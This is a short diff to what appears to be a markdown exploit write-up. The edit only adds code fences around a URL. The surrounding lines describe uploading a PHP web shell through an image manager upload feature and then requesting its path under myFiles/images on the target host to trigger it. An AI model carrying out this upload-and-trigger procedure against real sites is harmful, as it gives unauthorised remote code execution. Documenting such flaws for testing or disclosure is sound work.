@@ -14,5 +14,7 @@ Tools > Image Manager > Choose File > Upload
 ```
 
 ### Use following path to trigger the shell
+```
 http://<rhost>/<path>/myFiles/images/<phpShell>  
+```
 
